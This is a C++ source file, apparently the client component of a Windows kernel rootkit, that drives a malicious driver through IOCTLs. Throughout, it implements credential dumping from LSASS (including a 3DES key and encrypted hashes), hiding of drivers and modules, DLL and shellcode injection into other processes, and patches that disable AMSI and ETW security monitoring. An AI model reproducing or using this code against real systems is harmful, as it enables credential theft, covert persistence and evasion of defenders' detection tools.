#include "pch.h"
#include "MemoryHandler.h"

/*
 * Description:
 * HandleCommand is responsible for handling a memory related command.
 *
 * Parameters:
 * @command [_In_ std::string] -- The command to be handled.
 *
 * Returns:
 * There is no return value.
 */
void MemoryHandler::HandleCommand(_In_ std::string command) {
	std::vector<std::string> params = SplitStringBySpace(command);
	std::string commandName = params.at(0);
	params.erase(params.begin());

	if (params.size() == 0) {
		PrintHelp();
		return;
	}

	if (commandName.compare("dump_creds") == 0) {
		if (params.size() != 1) {
			PrintHelp();
			return;
		}
		std::shared_ptr<DesKeyInformation> desKey = std::make_shared<DesKeyInformation>();
		std::vector<Credentials> credentials = {}; 

		try {
			credentials = DumpCredentials(desKey);
		}
		catch (const MemoryHandlerException& e) {
			std::cerr << "Error while dumping credentials: " << e.what() << std::endl;
			return;
		}
		std::wstring currentUsername = L"";
		std::wstring currentDomain = L"";

		if (credentials.empty()) {
			std::cerr << "There are no credentials to display or an error occurred." << std::endl;
			return;
		}
		std::cout << "3DES Key (size: 0x" << std::hex << desKey->Size << "): ";

		for (DWORD i = 0; i < desKey->Size; i++)
			std::cout << static_cast<int>(static_cast<PUCHAR>(desKey->Data)[i]);
		std::cout << std::endl;
		std::cout << "Credentials:" << std::endl;

		for (SIZE_T i = 0; i < credentials.size(); i++) {
			currentUsername = std::wstring(credentials[i].Username.Buffer, credentials[i].Username.Length / sizeof(WCHAR));
			currentDomain = std::wstring(credentials[i].Domain.Buffer, credentials[i].Domain.Length / sizeof(WCHAR));
			std::wcout << L"\nUsername: " << currentUsername << std::endl;
			std::wcout << L"Domain: " << currentDomain << std::endl;
			std::cout << "Encrypted Hash: ";

			for (USHORT j = 0; j < credentials[i].EncryptedHash.Length; j++)
				std::cout << static_cast<int>(reinterpret_cast<PUCHAR>(credentials[i].EncryptedHash.Buffer)[j]);
			std::cout << std::endl;

			if (credentials[i].Username.Buffer) {
				free(credentials[i].Username.Buffer);
				credentials[i].Username.Buffer = nullptr;
			}
			if (credentials[i].Domain.Buffer) {
				free(credentials[i].Domain.Buffer);
				credentials[i].Domain.Buffer = nullptr;
			}
			if (credentials[i].EncryptedHash.Buffer) {
				free(credentials[i].EncryptedHash.Buffer);
				credentials[i].EncryptedHash.Buffer = nullptr;
			}
		}
		SafeFree(desKey->Data);
		std::cout << std::dec << std::endl;
	} else if (commandName.compare("hide_module") == 0) {
		std::wstring modulePath = L"";

		if (params.size() != 3) {
			PrintHelp();
			return;
		}

		if (!IsValidPid(params.at(1))) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(1).c_str()));

		try {
			modulePath = ParsePath<std::string, std::wstring>(params.at(1));
		}
		catch (const PathHelperException& e) {
			std::cerr << e.what() << std::endl;
			return;
		}
		HideModule(pid, modulePath) ? std::wcout << L"Module " << modulePath << L"hidden successfully." << std::endl :
			std::wcerr << L"Failed to hide module " << modulePath << std::endl;
	} 
	else if (commandName.compare("hide_driver") == 0) {
		std::wstring driverPath = L"";

		if (params.size() != 2) {
			PrintHelp();
			return;
		}
		try {
			driverPath = ParsePath<std::string, std::wstring>(params.at(1));
		}
		catch (const PathHelperException& e) {
			std::cerr << e.what() << std::endl;
			return;
		}
		HideDriver(driverPath, true) ? std::wcout << L"Driver " << driverPath << L"hidden successfully." << std::endl :
			std::wcerr << L"Failed to hide driver " << driverPath << std::endl;
	} 
	else if (commandName.compare("unhide_driver") == 0 || commandName.compare("reveal_driver") == 0) {
		std::wstring driverPath = L"";

		if (params.size() != 2) {
			PrintHelp();
			return;
		}
		try {
			driverPath = ParsePath<std::string, std::wstring>(params.at(1));
		}
		catch (const PathHelperException& e) {
			std::cerr << e.what() << std::endl;
			return;
		}
		HideDriver(driverPath, false) ? std::wcout << "Driver " << driverPath << " revealed successfully." << std::endl :
			std::wcerr << "Failed to reveal driver " << driverPath << std::endl;
	}
	else if (commandName.compare("inject_dll") == 0) {
		InjectionType injectionType;

		if (params.size() != 4) {
			PrintHelp();
			return;
		}
		if (!IsValidPid(params.at(2))) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(2).c_str()));
		std::string dllPath = params.at(3);

		if (params.at(1).compare("thread") == 0)
			injectionType = NtCreateThreadExInjection;
		else if (params.at(1).compare("apc") == 0)
			injectionType = APCInjection;
		else {
			std::cerr << "Invalid injection type." << std::endl;
			PrintHelp();
			return;
		}
		if (dllPath.empty()) {
			std::cerr << "DLL path cannot be empty." << std::endl;
			PrintHelp();
			return;
		}
		if (!IsValidPath(dllPath)) {
			PrintHelp();
			return;
		}
		if (!InjectDll(pid, dllPath, injectionType)) {
			std::cerr << "Failed to inject DLL " << dllPath << " into process " << pid << "." << std::endl;
			return;
		}
		std::cout << "DLL " << dllPath << " injected successfully into process " << pid << "." << std::endl;
	} 
	else if (commandName.compare("inject_shellcode") == 0) {
		std::vector<std::string> parameters;
		InjectionType injectionType;

		if (params.size() < 4 || params.size() > 7) {
			PrintHelp();
			return;
		}
		if (!IsValidPid(params.at(2))) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(2).c_str()));
		std::ifstream input(params.at(3), std::ios::binary);

		if (input.bad()) {
			std::cerr << "Invalid shellcode file." << std::endl;
			PrintHelp();
			return;
		}
		std::vector<byte> shellcode(std::istreambuf_iterator<char>(input), {});

		if (shellcode.empty()) {
			std::cerr << "Shellcode file is empty." << std::endl;
			PrintHelp();
			return;
		}
		
		if (params.at(1).compare("thread") == 0)
			injectionType = NtCreateThreadExInjection;
		else if (params.at(1).compare("apc") == 0)
			injectionType = APCInjection;
		else {
			std::cerr << "Invalid injection type." << std::endl;
			PrintHelp();
			return;
		}

		if (params.size() > 4) {
			parameters.push_back(params.at(4));

			if (params.size() > 5) {
				parameters.push_back(params.at(5));

				if (params.size() > 6) {
					parameters.push_back(params.at(6));
				}
			}
		}

		if (InjectShellcode(pid, shellcode, parameters, injectionType)) {
			std::cout << "Shellcode injected successfully into process " << pid << "." << std::endl;
		} else {
			std::cerr << "Failed to inject shellcode into process " << pid << "." << std::endl;
		}
	}
	else if (commandName.compare("patch") == 0) {
		if (params.size() != 5) {
			PrintHelp();
			return;
		}
		if (!IsValidPid(params.at(1))) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(1).c_str()));
		std::wstring moduleName = std::wstring(params.at(2).begin(), params.at(2).end());
		std::string functionName = params.at(3);
		std::vector<byte> patch = ConvertToVector(params.at(4));

		if (PatchModule(pid, moduleName, functionName, patch)) {
			std::wcout << L"Module " << moduleName << L" patched successfully." << std::endl;
		} else {
			std::wcerr << L"Failed to patch module " << moduleName << L"." << std::endl;
		}
	} 
	else if (commandName.compare("patch_amsi") == 0) {
		if (params.size() != 2) {
			PrintHelp();
			return;
		}
		if (!IsValidPid(params.at(1))) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(1).c_str()));

		if (PatchAmsi(pid)) {
			std::cout << "AMSI patched successfully in process " << pid << "." << std::endl;
		} else {
			std::cerr << "Failed to patch AMSI in process " << pid << "." << std::endl;
		}
	} 
	else if (commandName.compare("patch_etw") == 0) {
		if (params.size() != 2) {
			PrintHelp();
			return;
		}
		if (!IsValidPid(params.at(1))) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(1).c_str()));

		if (PatchEtw(pid)) {
			std::cout << "ETW patched successfully in process " << pid << "." << std::endl;
		}
		else {
			std::cerr << "Failed to patch ETW in process " << pid << "." << std::endl;
		}
	}
	else if (commandName.compare("execute_script") == 0) {
		if (params.size() != 2) {
			PrintHelp();
			return;
		}
		std::ifstream scriptFile(params.at(1), std::ios::binary);

		if (!scriptFile.is_open()) {
			std::cerr << "Failed to open script file: " << params.at(1) << std::endl;
			return;
		}
		std::vector<byte> script(std::istreambuf_iterator<char>(scriptFile), {});

		if (script.empty()) {
			std::cerr << "Script file is empty." << std::endl;
			return;
		}
		if (ExecuteScript(script)) {
			std::cout << "Script executed successfully." << std::endl;
		} else {
			std::cerr << "Failed to execute script." << std::endl;
		}
	} 
	else {
		std::cerr << "Invalid command!" << std::endl;
		PrintHelp();
	}
}

/*
 * Description:
 * DumpCredentials is responsible for dumping credentials from LSASS.
 *
 * Parameters:
 * @desKey [_Inout_ std::shared_ptr<DesKeyInformation>] -- The DES key information to be filled.
 *
 * Returns:
 * @std::vector<Credentials> -- A vector containing the dumped credentials.
 */
std::vector<Credentials> MemoryHandler::DumpCredentials(_Inout_ std::shared_ptr<DesKeyInformation> desKey) {
	OutputCredentials currentOutputCreds{};
	Credentials currentCreds{};
	std::vector<Credentials> credentials;
	DWORD returned = 0;
	DWORD credSize = 0;
	DWORD index = 0;
	bool error = false;

	// Generating cached credentials.
	if (!DeviceIoControl(hNidhogg.get(), IOCTL_DUMP_CREDENTIALS,
		nullptr, 0, &credSize, sizeof(credSize), &returned, nullptr)) {
		throw MemoryHandlerException("Failed to get credentials size from driver.");
	}

	if (credSize == 0)
		throw MemoryHandlerException("No credentials found or an error occurred while getting credentials size.");

	// Get 3DES key.
	desKey->Size = 0;
	desKey->Data = nullptr;

	if (!DeviceIoControl(hNidhogg.get(), IOCTL_DUMP_CREDENTIALS,
		nullptr, 0, desKey.get(), sizeof(DesKeyInformation), &returned, nullptr)) {
		throw MemoryHandlerException("Failed to get DES key size from driver.");
	}

	if (desKey->Size == 0) {
		throw MemoryHandlerException("Failed to get DES key size from driver.");
	}

	try {
		desKey->Data = SafeAlloc<PVOID>(desKey->Size);
	}
	catch (const SafeMemoryException& e) {
		throw MemoryHandlerException(e.what());
	}

	if (!DeviceIoControl(hNidhogg.get(), IOCTL_DUMP_CREDENTIALS,
		desKey.get(), sizeof(DesKeyInformation), desKey.get(), sizeof(DesKeyInformation), &returned, nullptr)) {
		SafeFree(desKey->Data);
		throw MemoryHandlerException("Failed to get DES key data from driver.");
	}

	// Get credentials.
	for (index = 0; index < credSize; index++) {
		currentOutputCreds.Index = index;
		currentOutputCreds.Creds.Username.Buffer = NULL;
		currentOutputCreds.Creds.Username.Length = 0;
		currentOutputCreds.Creds.Domain.Buffer = NULL;
		currentOutputCreds.Creds.Domain.Length = 0;
		currentOutputCreds.Creds.EncryptedHash.Buffer = NULL;
		currentOutputCreds.Creds.EncryptedHash.Length = 0;

		if (!DeviceIoControl(hNidhogg.get(), IOCTL_DUMP_CREDENTIALS,
			&currentOutputCreds, sizeof(currentOutputCreds), &currentOutputCreds, sizeof(currentOutputCreds),
			&returned, nullptr)) {
			error = true;
			break;
		}

		currentOutputCreds.Creds.Username.Buffer = (WCHAR*)malloc(currentOutputCreds.Creds.Username.Length);

		if (!currentOutputCreds.Creds.Username.Buffer) {
			error = true;
			break;
		}

		currentOutputCreds.Creds.Domain.Buffer = (WCHAR*)malloc(currentOutputCreds.Creds.Domain.Length);

		if (!currentOutputCreds.Creds.Domain.Buffer) {
			error = true;
			SafeFree(currentOutputCreds.Creds.Username.Buffer);
			break;
		}

		currentOutputCreds.Creds.EncryptedHash.Buffer = (WCHAR*)malloc(currentOutputCreds.Creds.EncryptedHash.Length);

		if (!currentOutputCreds.Creds.EncryptedHash.Buffer) {
			error = true;
			SafeFree(currentOutputCreds.Creds.Username.Buffer);
			SafeFree(currentOutputCreds.Creds.Domain.Buffer);
			break;
		}

		if (!DeviceIoControl(hNidhogg.get(), IOCTL_DUMP_CREDENTIALS,
			&currentOutputCreds, sizeof(currentOutputCreds), &currentOutputCreds, sizeof(currentOutputCreds),
			&returned, nullptr)) {

			error = true;
			SafeFree(currentOutputCreds.Creds.Username.Buffer);
			SafeFree(currentOutputCreds.Creds.Domain.Buffer);
			SafeFree(currentOutputCreds.Creds.EncryptedHash.Buffer);
			break;
		}

		currentCreds.Username = currentOutputCreds.Creds.Username;
		currentCreds.Domain = currentOutputCreds.Creds.Domain;
		currentCreds.EncryptedHash = currentOutputCreds.Creds.EncryptedHash;
		credentials.push_back(currentCreds);
	}

	if (error) {
		for (DWORD i = 0; i < credentials.size(); i++) {
			SafeFree(currentOutputCreds.Creds.Username.Buffer);
			SafeFree(currentOutputCreds.Creds.Domain.Buffer);
			SafeFree(currentOutputCreds.Creds.EncryptedHash.Buffer);
		}
		SafeFree(desKey->Data);
		throw MemoryHandlerException("Failed to dump credentials from driver.");
	}

	return credentials;
}

/*
 * Description:
 * HideDriver is responsible for hiding a driver.
 * 
 * Parameters:
 * @driverPath [_In_ std::wstring] -- The path of the driver to be hidden.
 * @hide	   [_In_ bool]		   -- Whether to hide or unhide the driver.
 * 
 * Returns:
 * @bool						   -- Whether the operation was successful or not.
 */
bool MemoryHandler::HideDriver(_In_ std::wstring driverPath, _In_ bool hide) {
	DWORD returned = 0;
	std::wstring parsedDriverName = L"";
	HiddenDriverInformation driverInfo{};

	if (!IsValidPath(driverPath))
		return false;

	try {
		parsedDriverName = ParsePath<std::wstring, std::wstring>(driverPath);
	}
	catch (const PathHelperException& e) {
		std::cerr << e.what() << std::endl;
		return false;
	}
	driverInfo.DriverName = parsedDriverName.data();
	driverInfo.Hide = hide;
	return DeviceIoControl(hNidhogg.get(), IOCTL_HIDE_UNHIDE_DRIVER, &driverInfo, sizeof(driverInfo), nullptr, 0, &returned, nullptr);
}

/*
 * Description:
 * HideModule is responsible for hiding a module inside a process.
 *
 * Parameters:
 * @pid [_In_ DWORD] -- The PID of the process.
 * @modulePath [_In_ std::wstring] -- The path of the module to be hidden.
 *
 * Returns:
 * @bool -- Whether the operation was successful or not.
 */
bool MemoryHandler::HideModule(_In_ DWORD pid, _In_ std::wstring modulePath) {
	if (pid <= SYSTEM_PID || !IsValidPath(modulePath)) {
		std::cerr << "Invalid PID or module path." << std::endl;
		return false;
	}
	HiddenModuleInformation moduleInfo{};
	moduleInfo.Pid = pid;
	moduleInfo.ModuleName = modulePath.data();
	DWORD returned = 0;
	return DeviceIoControl(hNidhogg.get(), IOCTL_HIDE_MODULE, &moduleInfo, sizeof(moduleInfo), nullptr, 0, &returned, nullptr);
}

/*
 * Description:
 * InjectDll is responsible for injecting a DLL into a process.
 *
 * Parameters:
 * @pid [_In_ DWORD] -- The PID of the target process.
 * @dllPath [_In_ std::string] -- The path of the DLL to be injected.
 * @injectionType [_In_ InjectionType] -- The type of injection to be used.
 *
 * Returns:
 * @bool -- Whether the injection was successful or not.
 */
bool MemoryHandler::InjectDll(_In_ DWORD pid, _In_ std::string dllPath, _In_ InjectionType injectionType) {
	if (pid <= SYSTEM_PID || !IsValidPath(dllPath)) {
		std::cerr << "Invalid PID or DLL path." << std::endl;
		return false;
	}
	DllInformation dllInformation{};
	dllInformation.Type = injectionType;
	dllInformation.Pid = pid;
	errno_t err = strcpy_s(dllInformation.DllPath, dllPath.c_str());

	if (err != 0) {
		std::cerr << "Failed to copy DLL path." << std::endl;
		return false;
	}
	DWORD returned = 0;
	return DeviceIoControl(hNidhogg.get(), IOCTL_INJECT_DLL, &dllInformation, sizeof(dllInformation), nullptr, 0, &returned, nullptr);
}

/*
 * Description:
 * InjectShellcode is responsible for injecting shellcode into a process.
 *
 * Parameters:
 * @pid [_In_ DWORD] -- The PID of the target process.
 * @shellcode [_In_ std::vector<byte>] -- The shellcode to be injected.
 * @parameters [_In_ std::vector<std::string>] -- The parameters for the shellcode.
 * @injectionType [_In_ InjectionType] -- The type of injection to be used.
 *
 * Returns:
 * @bool -- Whether the injection was successful or not.
 */
bool MemoryHandler::InjectShellcode(_In_ DWORD pid, _In_ std::vector<byte> shellcode, std::vector<std::string> parameters, _In_ InjectionType injectionType) {
	DWORD returned = 0;

	if (pid <= SYSTEM_PID || shellcode.empty()) {
		std::cerr << "Invalid PID or shellcode." << std::endl;
		return false;
	}
	if (parameters.size() > MAX_SHELLCODE_PARAMETERS) {
		std::cerr << "Too many parameters for shellcode injection." << std::endl;
		return false;
	}
	ShellcodeInformation shellcodeInfo{};
	shellcodeInfo.Pid = pid;
	shellcodeInfo.Type = injectionType;
	shellcodeInfo.ShellcodeSize = shellcode.size();
	shellcodeInfo.Shellcode = shellcode.data();

	if (parameters.size() > 0) {
		shellcodeInfo.Parameter1 = static_cast<char*>(parameters[0].data());
		shellcodeInfo.Parameter1Size = parameters[0].size();

		if (parameters.size() > 1) {
			shellcodeInfo.Parameter2 = static_cast<char*>(parameters[1].data());
			shellcodeInfo.Parameter2Size = parameters[1].size();

			if (parameters.size() > 2) {
				shellcodeInfo.Parameter3 = static_cast<char*>(parameters[2].data());
				shellcodeInfo.Parameter3Size = parameters[2].size();
			}
		}
	}
	return DeviceIoControl(hNidhogg.get(), IOCTL_INJECT_SHELLCODE, &shellcodeInfo, sizeof(shellcodeInfo), nullptr, 0, &returned, nullptr);
}

/*
 * Description:
 * PatchModule is responsible for patching a module inside a process.
 *
 * Parameters:
 * @pid [_In_ DWORD] -- The PID of the target process.
 * @moduleName [_In_ std::wstring] -- The name of the module to be patched.
 * @functionName [_In_ std::string] -- The name of the function to be patched.
 * @patch [_In_ std::vector<byte>] -- The patch data.
 *
 * Returns:
 * @bool -- Whether the patching was successful or not.
 */
bool MemoryHandler::PatchModule(_In_ DWORD pid, _In_ std::wstring moduleName, _In_ std::string functionName, _In_ std::vector<byte> patch) {
	DWORD returned;
	PatchedModule patchedModule{};

	if (pid <= SYSTEM_PID || !IsValidPath(moduleName) || functionName.size() == 0 || patch.size() == 0)
		return false;

	patchedModule.Pid = pid;
	patchedModule.PatchLength = static_cast<ULONG>(patch.size());
	patchedModule.ModuleName = moduleName.data();
	patchedModule.FunctionName = functionName.data();
	patchedModule.Patch = patch.data();
	return DeviceIoControl(hNidhogg.get(), IOCTL_PATCH_MODULE, &patchedModule, sizeof(patchedModule), nullptr, 0, &returned, nullptr);
}

/*
 * Description:
 * PatchAmsi is responsible for patching AMSI in a process.
 *
 * Parameters:
 * @pid [_In_ DWORD] -- The PID of the target process.
 *
 * Returns:
 * @bool -- Whether the patching was successful or not.
 */
bool MemoryHandler::PatchAmsi(_In_ DWORD pid) {
	return PatchModule(pid, AMSI_PATH, "AmsiScanBuffer", AMSI_BYPASS_PAYLOAD);
}

/*
 * Description:
 * PatchEtw is responsible for patching ETW in a process.
 *
 * Parameters:
 * @pid [_In_ DWORD] -- The PID of the target process.
 *
 * Returns:
 * @bool -- Whether the patching was successful or not.
 */
bool MemoryHandler::PatchEtw(_In_ DWORD pid) {
	return PatchModule(pid, NTDLL_PATH, "EtwEventWrite", ETW_BYPASS_PAYLOAD);
}

/*
 * Description:
 * ExecuteScript is responsible for executing a script in the kernel.
 *
 * Parameters:
 * @script [_In_ std::vector<byte>] -- The script to be executed.
 * @scriptSize [_In_ SIZE_T] -- The size of the script.
 *
 * Returns:
 * @bool -- Whether the execution was successful or not.
 */
bool MemoryHandler::ExecuteScript(_In_ std::vector<byte> script) {
	DWORD bytesReturned = 0;
	ScriptInformation scriptInfo{};

	if (script.size() == 0)
		return false;

	scriptInfo.Script = script.data();
	scriptInfo.ScriptSize = script.size();
	return DeviceIoControl(hNidhogg.get(), IOCTL_EXEC_SCRIPT, &scriptInfo, sizeof(scriptInfo), nullptr, 0, &bytesReturned, nullptr);
}